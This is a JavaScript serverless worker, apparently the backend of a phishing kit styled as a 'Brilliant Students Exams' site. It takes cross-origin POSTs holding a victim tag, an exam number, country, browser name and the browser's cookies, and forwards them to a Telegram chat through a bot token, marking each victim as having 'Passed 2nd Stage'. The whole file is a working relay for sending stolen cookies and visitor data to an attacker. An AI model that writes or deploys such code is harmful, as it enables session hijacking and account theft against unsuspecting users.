export default {
  async fetch(request, env) {
    const corsHeaders = {
      "Access-Control-Allow-Origin": "*",
      "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
      "Access-Control-Allow-Headers": "Content-Type",
    };

    // Handle preflight requests (browser CORS checks)
    if (request.method === "OPTIONS") {
      return new Response(null, { headers: corsHeaders });
    }

    if (request.method !== "POST") {
      return new Response('Only POST allowed', { status: 405, headers: corsHeaders });
    }

    let data;
    try {
      data = await request.json();
    } catch {
      return new Response('Invalid JSON', { status: 400, headers: corsHeaders });
    }

    const { userTag, examNumber, geoInfo, browserInfo, cookies } = data;

    if (!userTag || !examNumber) {
      return new Response('Missing userTag or examNumber', { status: 400, headers: corsHeaders });
    }

    const BOT_TOKEN = env.BOT_TOKEN;
    const CHAT_ID = env.CHAT_ID;

    if (!BOT_TOKEN || !CHAT_ID) {
      return new Response('Environment variables not set', { status: 500, headers: corsHeaders });
    }

    const message =
      `📘 *Brilliant Students Exams*\n` +
      `🏷️ Tag: ${userTag}\n` +
      `📨 Exam Number: ${examNumber}\n` +
      `🌍 Country: ${geoInfo?.country || 'Unknown'}\n` +
      `🖥️ Browser: ${browserInfo?.name || 'Unknown'}\n` +
      `🍪 Cookies: ${cookies || 'None'}\n` +
      `✔️ Passed 2nd Stage`;

    try {
      const telegramRes = await fetch(
        `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
        {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
          }),
        }
      );

      const telegramData = await telegramRes.json();

      if (telegramData.ok) {
        return new Response(JSON.stringify({ success: true }), {
          status: 200,
          headers: { ...corsHeaders, "Content-Type": "application/json" },
        });
      } else {
        return new Response(JSON.stringify({
          error: 'Telegram API error',
          details: telegramData
        }), {
          status: 502,
          headers: { ...corsHeaders, "Content-Type": "application/json" },
        });
      }
    } catch (err) {
      return new Response(JSON.stringify({
        error: 'Fetch to Telegram failed',
        details: err.message
      }), {
        status: 502,
        headers: { ...corsHeaders, "Content-Type": "application/json" },
      });
    }
  }
};
